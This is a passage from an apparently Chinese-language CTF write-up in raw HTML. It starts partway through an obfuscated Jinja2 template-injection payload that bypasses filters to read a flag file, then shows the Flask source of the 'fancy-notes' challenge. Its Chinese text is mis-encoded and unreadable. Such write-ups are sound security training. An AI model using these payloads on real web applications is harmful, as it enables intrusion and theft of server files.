style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">bdict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ses__&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">first&lt;/span>&lt;span style="color:#111">)()))[([&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">length&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">length&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">length&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">])(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">fla&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">first&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">bdict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">g&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">first&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">_x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">first&lt;/span>&lt;span style="color:#111">)()}}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213140710659.png" alt="image-20211213140710659">&lt;/p>
&lt;p>&lt;code>idek{us1nG_f1lt3rs_t0_byP4s5_f1lt3r5}&lt;/code>&lt;/p>
&lt;h2 id="fancy-notes">fancy-notes&lt;/h2>
&lt;blockquote>
&lt;p>Your typical note taking app, but this time it&amp;rsquo;s fancy! Share your coolest notes with the admin, and if they&amp;rsquo;re cool enough, maybe he&amp;rsquo;ll give you a special prize.&lt;/p>
&lt;p>&lt;a href="http://fancy-notes.chal.idek.team">http://fancy-notes.chal.idek.team&lt;/a> | &lt;a href="https://ctf.idek.team/handouts/web/FancyNotes/fancy-notes-dist.zip">https://ctf.idek.team/handouts/web/FancyNotes/fancy-notes-dist.zip&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ä¸€ä¸ªflaskï¼Œæœ‰æäº¤notesçš„åœ°æ–¹ï¼Œå°è¯•SSTIå¤±è´¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214000607181.png" alt="image-20211214000607181">&lt;/p>
&lt;p>çœ‹ä»£ç é€»è¾‘æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">send_from_directory&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sqlite3&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">static_url_path&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;/static&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">static_folder&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;static&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">template_folder&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;templates&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;SECRET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;secret&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># secret passwdåœ¨çŽ¯å¢ƒå˜é‡ä¸­&lt;/span>
&lt;span style="color:#111">ADMIN_PASS&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ADMIN_PASS&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;flag.txt&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#75715e"># flag is here&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">init_db&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">con&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sqlite3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/database.db&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># sqliteæ•°æ®åº“&lt;/span>
&lt;span style="color:#111">cur&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cursor&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;INSERT INTO USERS (username, password) VALUES (&amp;#34;admin&amp;#34;, ?)&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">ADMIN_PASS&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#75715e"># æ’å…¥adminè´¦å·å¯†ç &lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;CREATE TABLE IF NOT EXISTS notes (title TEXT NOT NULL, content TEXT NOT NULL, owner TEXT NOT NULL)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;INSERT INTO notes (title, content, owner) VALUES (&amp;#34;flag&amp;#34;, ?, 1)&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#75715e"># æ’å…¥flagè¿›å…¥notesè¡¨&lt;/span>
&lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">commit&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">try_login&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">):&lt;/span> &lt;span style="color:#75715e"># ä»Žæ•°æ®åº“ä¸­çœ‹æœ‰æ²¡æœ‰åŒ¹é…çš„è´¦å·å¯†ç  è¿”å›žç¬¬ä¸€æ¡ ä¸å­˜åœ¨è¦†ç›–&lt;/span>
&lt;span style="color:#111">con&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sqlite3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/database.db&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">cur&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cursor&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;SELECT * FROM users WHERE username = ? AND password = ?&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">row&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fetchone&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">row&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">row&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">row&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]}&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">try_register&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">):&lt;/span> &lt;span style="color:#75715e"># æ’å…¥æ–°çš„ç”¨æˆ·åæ•°æ®è¿›å…¥usersè¡¨&lt;/span>
&lt;span style="color:#111">con&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sqlite3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/database.db&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">cur&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cursor&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;INSERT INTO users (username, password) VALUES (?, ?)&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#111">sqlite3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">IntegrityError&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>
&lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">commit&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">):&lt;/span> &lt;span style="color:#75715e"># å¯»æ‰¾userçš„note&lt;/span>
&lt;span style="color:#111">con&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sqlite3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/database.db&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">cur&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cursor&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;SELECT title, content FROM notes WHERE owner = ? AND (INSTR(content, ?) OR INSTR(title,?))&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">rows&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fetchone&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">rows&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">get_notes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">):&lt;/span> &lt;span style="color:#75715e"># å¾—åˆ°userçš„å…¨éƒ¨notes&lt;/span>
&lt;span style="color:#111">con&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sqlite3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/database.db&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">cur&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cursor&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;SELECT title, content FROM notes WHERE owner = ?&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">rows&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fetchall&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">rows&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">create_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">):&lt;/span> &lt;span style="color:#75715e"># åˆ›å»ºuserçš„noteè¿›å…¥notesè¡¨&lt;/span>
&lt;span style="color:#111">con&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sqlite3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/database.db&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">cur&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cursor&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;SELECT title FROM notes where title=? AND owner=?&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">row&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fetchone&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">row&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;INSERT INTO notes (title, content, owner) VALUES (?, ?, ?)&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">commit&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">before_first_request&lt;/span> &lt;span style="color:#75715e"># è¯·æ±‚ä¹‹å‰å…ˆåˆ é™¤/tmp/database.db ä¹‹åŽåˆå§‹åŒ–&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">setup&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">remove&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/database.db&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span>
&lt;span style="color:#111">init_db&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">after_request&lt;/span> &lt;span style="color:#75715e"># è¿”å›žå“åº”æ—¶é’ˆå¯¹cacheæ·»åŠ no-storeçš„å“åº”å¤´&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">add_headers&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;Cache-Control&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;no-store&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">response&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># æ²¡æœ‰sessionè®°å½•å…ˆç™»å½•&lt;/span>
&lt;span style="color:#111">notes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">get_notes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#75715e"># session[&amp;#39;id&amp;#39;]ä¸­å­˜å‚¨id session[&amp;#39;username&amp;#39;]ä¸­å­˜å‚¨username&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">notes&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">notes&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;select a note to fancify!&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># æ— è¿‡æ»¤ä½†æ˜¯ä¸å­˜åœ¨SSTI&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">login&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;login.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
